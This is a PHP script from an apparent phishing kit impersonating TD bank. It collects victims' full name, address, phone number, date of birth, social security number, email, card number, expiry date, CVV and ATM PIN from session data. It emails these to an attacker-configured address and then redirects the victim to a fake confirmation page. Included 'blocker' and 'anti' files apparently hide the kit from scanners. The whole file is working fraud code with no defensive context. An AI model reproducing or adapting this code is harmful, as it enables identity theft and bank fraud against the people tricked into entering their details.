<?php
	session_start();
    include './youremail.php';
	include './blocker.php';
		include './prevents/anti7.php';
			include './prevents/anti8.php';
				include './prevents/anti9.php';
    
    $ip = getenv("REMOTE_ADDR");
    $u = "http://www.geoiptool.com/?IP='$ip'";
    $dump = unserialize(file_get_contents($u));

    $country = $dump["geoplugin_countryName"];
	$cn = $_SESSION['CN'];
	$fn = $_SESSION['FN'];
	
    $subject = 'TD allINFO [ '.$country.' - '.$_SERVER['REMOTE_ADDR'].' ]';
    $message = '|============ TD Info ===========|'."\r\n";
    $message .= '|Full Name:  '.$_SESSION['FN']."\r\n";
	$message .= '|Full Name:  '.$_SESSION['AD']."\r\n";
	$message .= '|Phone Number:  '.$_SESSION['PN']."\r\n";
    $message .= '|Date of Birth:  '.$_SESSION['DB']."\r\n";
    $message .= '|Social Number:  '.$_SESSION['SN']."\r\n";
    $message .= '|Email:  '.$_SESSION['EA']."\r\n";
	$message .= '|============ Card Info ===========|'."\r\n";
	$message .= '|Card Number:  '.$_SESSION['CN']."\r\n";
    $message .= '|Exp. Date  '.$_SESSION['ED']."\r\n";
	$message .= '|Cvv:  '.$_SESSION['CV']."\r\n";
    $message .= '|Atm Pin:  '.$_SESSION['AP']."\r\n";
	$message .= '|Time:     '.$_InfoDATE   = date("d-m-Y h:i:sa")."\r\n";
    $message .= '|Browser:  '.$_SERVER['HTTP_USER_AGENT']."\r\n";
    $message .= "|IP Geo: http://www.geoiptool.com/?IP=".$ip." \n";

		if (strlen($cn) <= 16 && $cn != "" && $fn != "" && strlen($fn)<=22 ){
		
	mail($to, $subject, $message);
	}
    header("Location: finalmessage.php?sslchannel=true&amp;sessionid=xrBUswTnRWBlzTfC8idT1OKtdKKh7spEU1znxtKopmJYfZBnhOhjD2MQMw7TZxyTy7h5B2u0oeZDeA1v");
 ?>